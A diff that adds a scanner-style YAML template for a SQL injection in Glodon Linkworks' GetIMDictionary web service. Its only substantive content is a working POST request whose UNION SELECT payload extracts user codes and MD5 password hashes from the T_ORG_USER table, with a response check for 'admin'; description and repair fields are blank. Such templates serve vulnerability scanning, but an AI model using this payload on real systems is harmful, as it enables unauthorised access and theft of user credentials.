@@ -1,0 +1,18 @@
+id:
+info:
+  name: 广联达Linkworks GetIMDictionary SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary
+  data: |
+    key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+response1:
+  headers:
+  body: admin
+  code:
+requests2:
+response2:
